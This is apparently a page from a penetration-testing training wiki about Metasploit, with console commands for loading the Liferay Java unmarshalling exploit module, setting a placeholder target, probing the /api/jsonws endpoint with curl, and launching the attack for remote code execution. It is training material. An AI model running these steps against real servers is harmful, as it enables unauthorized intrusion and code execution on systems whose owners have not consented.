---
title: Metasploit
sidebar_position: 7
tags: [tool, exploitation]
---

> **One-liner:** Penetration testing framework with hundreds of pre-built exploits for known CVEs in web applications and services.

## When to use it

- Exploiting known CVEs in web applications
- Post-exploitation (payloads, shells)
- Training context example: Liferay portal exploit via `/api/jsonws` endpoint

## Install

Pre-installed on Kali Linux. Start the console:

```bash
msfconsole
```

## Key commands

```bash
# Select an exploit module
use exploit/multi/http/liferay_java_unmarshalling

# Set the target host
set RHOSTS target.com

# Review required and optional options
show options

# Launch the exploit
exploit
# (or)
run
```

### Typical workflow

| Step | Command |
|------|---------|
| Find a module | `search liferay` |
| Load it | `use exploit/multi/http/liferay_java_unmarshalling` |
| Set target | `set RHOSTS target.com` |
| Check config | `show options` |
| Execute | `exploit` |

:::tip 💡 Remember
Always run `show options` before `exploit` — missing required fields (RHOSTS, LHOST, port) will cause the module to fail silently or error out.
:::

## What is Liferay?

**Liferay** is an open-source enterprise Java portal platform used by organisations to build internal portals and intranets. It was the specific target used in the training.

:::warning Liferay vulnerability used in training
- **Module:** `exploit/multi/http/liferay_java_unmarshalling`
- **Entry point:** `/api/jsonws` — a public JSON web services endpoint exposed by default
- **Why it works:** The endpoint deserializes Java objects without proper validation. Sending a crafted payload triggers remote code execution (RCE) on the server.
- **Discovery:** If you find `/api/jsonws` on a target, check the Liferay version and search for matching Metasploit modules with `search liferay`.
:::

```bash
# Discover Liferay endpoints
curl https://target.com/api/jsonws

# Search for matching modules
msf> search liferay
```
